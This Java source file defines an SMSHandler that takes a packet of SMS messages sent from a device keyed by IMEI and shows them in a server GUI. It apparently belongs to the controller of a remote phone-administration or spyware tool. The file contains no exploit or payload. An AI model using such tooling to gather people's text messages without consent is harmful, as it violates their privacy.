package handler;

import java.util.ArrayList;

import server.Server;
import Packet.Packet;
import Packet.SMSPacket;
import Packet.SMSTreePacket;
import gui.GUI;

public class SMSHandler implements PacketHandler {

	private GUI gui;
	private int channel;
	private String imei;
	
	public SMSHandler(int chan, String imei, GUI gui) {
		channel = chan;
		this.imei = imei;
		this.gui = gui;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
	}

	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("SMS tree data has been received");
		c.getChannelHandlerMap().get(imei).removeListener(channel);
		SMSTreePacket packet = (SMSTreePacket) p;
		//ArrayList<SMSPacket> sms = new ArrayList<SMSPacket>();
		gui.updateSMS(imei, packet.getList());
	}

}
